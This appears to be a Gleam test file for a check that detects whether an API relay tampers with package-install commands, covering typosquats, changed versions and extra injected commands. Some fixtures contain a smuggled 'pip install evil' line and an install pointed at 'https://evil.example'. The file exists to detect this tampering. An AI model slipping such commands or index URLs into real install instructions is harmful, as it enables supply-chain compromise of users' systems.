import gleam/list
import gleam/option.{Some}
import gleam/string
import receipt/http/types as http
import receipt/steps/s08_tool_substitution.{
  Benign, Echo, Exact, Matched, Missing, NoCommand, Probe, Returned, Rewritten,
  Substituted, ToolCall,
} as s08
import receipt/verdict.{Anomaly, Clean, Inconclusive}
import support/fake.{Fake}
import support/world

pub fn probes_cover_text_and_tool_calls_test() {
  let probes = s08.probes()
  assert list.count(probes, fn(p) { p.kind == Echo }) == 4
  assert list.count(probes, fn(p) { p.kind == ToolCall }) == 2
  assert list.all(probes, fn(p) {
    string.contains(p.command, "==") || string.contains(p.command, "@")
  })
}

pub fn identical_text_is_exact_test() {
  assert s08.compare(
      "pip install requests==2.31.0",
      "pip install requests==2.31.0",
    )
    == Exact
}

pub fn case_and_trailing_punctuation_are_benign_test() {
  assert s08.compare(
      "npm install lodash@4.17.21",
      "npm install lodash@4.17.21.",
    )
    == Benign
  assert s08.compare(
      "npm install lodash@4.17.21",
      "NPM install lodash@4.17.21\n",
    )
    == Benign
  assert s08.compare("cargo add serde@1.0.203", "cargo  add   serde@1.0.203")
    == Benign
}

pub fn a_typosquat_is_a_substitution_test() {
  assert s08.compare(
      "pip install requests==2.31.0",
      "pip install reqeusts==2.31.0",
    )
    == Substituted
}

pub fn a_changed_version_is_a_substitution_test() {
  assert s08.compare(
      "pip install requests==2.31.0",
      "pip install requests==2.31.1",
    )
    == Substituted
}

pub fn a_space_inside_the_package_name_is_a_substitution_test() {
  assert s08.compare(
      "pip install requests==2.31.0",
      "pip install req uests==2.31.0",
    )
    == Substituted
}

pub fn an_extra_command_is_a_substitution_test() {
  assert s08.compare(
      "pip install requests==2.31.0",
      "pip install requests==2.31.0\npip install evil",
    )
    == Substituted
  assert s08.compare(
      "pip install requests==2.31.0",
      "pip install requests==2.31.0 --index-url https://evil.example",
    )
    == Substituted
}

pub fn wrappers_are_stripped_test() {
  assert s08.strip_wrappers("```bash\npip install x==1\n```")
    == "pip install x==1"
  assert s08.strip_wrappers("`npm install y@2`") == "npm install y@2"
  assert s08.strip_wrappers("\"cargo add z\"") == "cargo add z"
  assert s08.strip_wrappers("$ go get a/b") == "go get a/b"
  assert s08.strip_wrappers("  plain  ") == "plain"
}

pub fn a_difference_must_repeat_to_count_test() {
  let expected = "pip install requests==2.31.0"
  let bad = Returned("pip install reqeusts==2.31.0")
  assert s08.settle(expected, bad, fn() { bad })
    == Rewritten("pip install reqeusts==2.31.0", "pip install reqeusts==2.31.0")
  assert s08.settle(expected, bad, fn() { Returned(expected) })
    == Matched(Exact, expected)
  assert s08.settle(expected, bad, fn() { Missing("timeout") })
    == NoCommand("timeout")
}

pub fn a_match_needs_no_second_attempt_test() {
  let expected = "pip install requests==2.31.0"
  assert s08.settle(expected, Returned(expected), fn() { panic as "not called" })
    == Matched(Exact, expected)
}

pub fn honest_relay_is_clean_test() {
  let result = s08.run(world.ctx(fake.handler(fake.honest())))
  assert result.verdict == Clean
  assert string.contains(result.summary, "6 of 6")
}

pub fn text_rewriting_is_an_anomaly_test() {
  let relay = Fake(..fake.honest(), rewrites: [#("requests", "reqeusts")])
  let result = s08.run(world.ctx(fake.handler(relay)))
  assert result.verdict == Anomaly
  assert string.contains(result.summary, "1 of 6")
  assert string.contains(result.summary, "signal")
}

pub fn tool_call_only_rewriting_is_caught_test() {
  // numpy appears only in a structured tool-call probe.
  let relay = Fake(..fake.honest(), rewrites: [#("numpy", "numpi")])
  let result = s08.run(world.ctx(fake.handler(relay)))
  assert result.verdict == Anomaly
}

pub fn a_relay_without_tool_support_is_still_judged_on_text_test() {
  let relay = Fake(..fake.honest(), supports_tools: False)
  let result = s08.run(world.ctx(fake.handler(relay)))
  assert result.verdict == Clean
  assert string.contains(result.summary, "4 of 6")
}

pub fn no_commands_at_all_is_inconclusive_test() {
  let result = s08.run(world.ctx(fn(_, _) { Error(http.Timeout) }))
  assert result.verdict == Inconclusive
  assert result.reason == Some("no_commands")
}

pub fn build_counts_rewritten_probes_test() {
  let probe = Probe("x", Echo, "a b")
  let result =
    s08.build([
      #(probe, Rewritten("a c", "a c")),
      #(probe, Matched(Benign, "A b")),
      #(probe, NoCommand("timeout")),
    ])
  assert result.verdict == Anomaly
  assert string.contains(result.summary, "1 of 3")
}
